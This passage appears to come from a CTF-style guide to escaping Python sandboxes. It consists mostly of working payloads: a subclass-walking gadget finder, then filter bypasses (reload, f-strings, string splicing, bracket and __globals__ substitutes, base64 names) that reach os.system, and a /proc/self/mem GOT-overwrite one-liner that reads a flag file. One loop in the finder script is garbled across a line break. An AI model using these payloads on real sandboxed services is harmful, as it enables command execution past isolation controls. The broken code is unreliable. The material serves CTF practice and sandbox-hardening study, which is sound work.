target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']
all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))
all_modules = list(set(list(find_modules.keys()) + target_modules))
subclasses = ().__class__.__bases__[0].__subclasses__()
sub_name = [s.__name__ for s in subclasses]
# The first traversal, such as:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()
print('----------1-----------')
for i, s in enumerate(sub_name):
    for f in all_targets:
        if f == s:
            if f in target_functions:
                print(i, f)
            elif f in all_modules:
                target = find_modules[f]
                sub_dict = subclasses[i].__dict__
                for t in target
t:
                    if t in sub_dict:
                        print(i, f, target)
print('----------2-----------')
# The second type of traversal, such as:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.__globals__
        for m in all_targets:
            if m in more:
                print(i, sub, m, find_modules.get(m))
    except Exception as e:
        pass
print('----------3-----------')
# The third type of traversal, such as:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("ls")')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.__globals__.values()
        for j, v in enumerate(more):
            for f in all_targets:
                try:
                    if f in v:
                        if f in target_functions:
                            print(i, j, sub, f)
                        elif f in all_modules:
                            target = find_modules.get(f)
                            sub_dict = v[f].__dict__
                            for t in target:
                                if t in sub_dict:
                                    print(i, j, sub, f, target)
                except Exception as e:
                    pass
    except Exception as e:
        pass
print('----------4-----------')
# The fourth type of traversal: such as:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")
# <class 'warnings.catch_warnings'> class is very special. _module=sys.modules['warnings'] is defined internally. Then the warnings module contains __builtins__, which is not universal, and is essentially similar to the first method.
for i, sub in enumerate(subclasses):
    try:
        more = sub()._module.__builtins__
        for f in all_targets:
            if f in more:
                print(i, f)
    except Exception as e:
        pass
```

# Bypass method
## reload
Even if the hazard modules are deleted using del, you can still use the `reload` function to reload these hazard modules.

```python
del __builtins__.__dict__['__import__']
del __builtins__.__dict__['eval']
del __builtins__.__dict__['execfile']
del __builtins__.__dict__['input']

reload(__builtins__)
import os
dit(os)
```

## f modifier
A new string type modifier was introduced in `PEP 498`: `f` or `F`. A string modified with `f` will be able to execute code. This method is only available in `python3.6.0+`. Simply put, it can be understood as a `exec()` outer layer of a string.

```python
f'{__import__("os").system("whoami")}'
```

## Quotes exist
```text
'f''lag'
'f'+'lag'
'galf'[::-1]
'%clag'%(102)
chr(102)+'lag'
\146\154\141\147
\x66\x6c\x61\x67
'flab'.replace('b','g')
a='fl';b='ag';f'{a}{b}'
Python2 can also obtain any characters through hex(1718378855)[2:].decode('hex'), but in python3 the decoding of hex is moved to codecs.encode()
```

## Quotes are not present
```text
chr(102)+chr(108)+chr(97)+chr(103)
str().join(list(dict(fl=1,ag=2).keys()))
Or get a single character through dir(dir)[1][2], etc. and then splice it
```

## Filter brackets
 - Call the `__getitem__` function and replace it directly.
 - Call the `pop` function to replace.

```python
# Prototype
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('whoami')

# __getitem__() replaces brackets[]
''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('whoami')

# pop() replaces brackets[], and use them in combination with __getitem__()
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('whoami')
```

## base64 encoding

```python
import base64
base64.b64encode('__import__')
base64.b64encode('os')
__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))
```

## Filter __globals__
 - You can use `func_globals` to replace it directly.
 - `__getattribute__('__globa'+'ls__');`

```python
# The prototype is to call __globals__.
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('whoami')

# If __globals__ is filtered, it can be replaced directly with func_globals.
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['__builtins__']['__import__']('os').system('whoami')

# You can also bypass it by splicing strings.
''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__("__glo"+"bals__")['__builtins__']['__import__']('os').system
('whoami')
```


## write Modify get table
In fact, a memory operation method of `/proc/self/mem` is a memory mirror that can read and write to all memory of the process, including executable code. If you can get the offset of some Python functions, such as `system`, etc., you can express the purpose of `getshell` by overwriting `got`. For example, in the following command statement, the first address is the offset of `system`, and the second is the offset of `fopen`, and you can get related information through `objdump`.

```sh
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))
```

# refer to
 - [Python Sandbox](https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/#writegot)

 - [python sandbox escape](https://dar1in9s.github.io/2020/03/20/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#python-%E7%BB%95%E8%BF%87%E6%B2%99%E7%9B%92%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0%E3%80%81%E5%B1%9E%E6%80%A7)

 - [Python sandbox escape summary](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/)